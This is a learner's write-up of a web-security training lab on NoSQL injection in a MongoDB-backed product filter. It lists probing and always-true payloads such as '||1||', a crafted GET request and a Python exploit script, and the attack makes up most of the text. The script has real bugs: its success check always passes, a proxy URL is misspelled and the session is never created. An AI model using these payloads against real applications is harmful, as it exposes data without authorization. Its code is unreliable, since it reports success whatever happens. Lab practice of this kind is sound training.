The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

---

**Goal:** display unreleased products by exploiting NoSQL.

- In Repeater, submit a `'` character in the category parameter. Notice that this causes a JavaScript syntax error. This may indicate that the user input was not filtered or sanitized correctly.
   
- Submit a valid JavaScript payload in the value of the category query parameter. You could use the following payload:

```php
Gifts'+'
```

_Make sure to URL-encode the payload by highlighting it and using the `Ctrl-U` hotkey. Notice that it doesn't cause a syntax error. This indicates that a form of server-side injection may be occurring._

Insert a false condition in the category parameter.
```php
' && 0 && 'x
```
- Doesn't display items 

Insert a true condition in the category parameter.
```php
' && 1 && 'x
```
- Displays three items in the gifts category

That means that there is conditional behaviour in the app based on the true and false requests i sent.

Now that i have identified that i can influence boolean conditions, i can attempt to override existing conditions to exploit the vulnerability. 

Payload 

A boolean condition that always evaluates to true
```php
'||1||'
```

Exploit details:

`GET /filter?category=Gifts'||1||'` 

URL: `https://0a7400450454676a81e634f60003001e.web-security-academy.net/filter?category=Gifts`

Requires session.

Script

```python
#!/usr/bin/python3

import urllib3
import requests
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'https': 'http://127.0.0.1:8080', 'http': 'htps://127.0.0.1:8080'}

def get_hidden_items(s, url):
	payload = "filter?category=Gifts'||1||'"
	r = requests.get(url + payload, verify=False, proxies=proxies)
	if "Bucket of Doom" or "Picture Box" in r.text:
		print("[+] Exploit success!")
		
	else:
		print("[+] Exploit failed.")
		sys.exit(-1)


def main():
	if len(sys.argv) != 2:
		print("[+] Usage: %s <URL>" % sys.argv[0])
		print("[+] Example: %s www.example.com/" % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	s = requests.Session
	print("[+] Attempting to exploit the server...")
	get_hidden_items(s, url)
	
if __name__ == '__main__':
	main()
```

I was a little bit rusty making this, but i didn't get too many errors so i'm quite pleased with that.

You may need to change a few things if you wish to use this script:
- Product category `Gifts`

_I think the items might change as well which is why i added an or with an extra item, so even though it may say that it failed, it could still have completed the lab._

---

**Completed:** _13:35 2024-09-18_

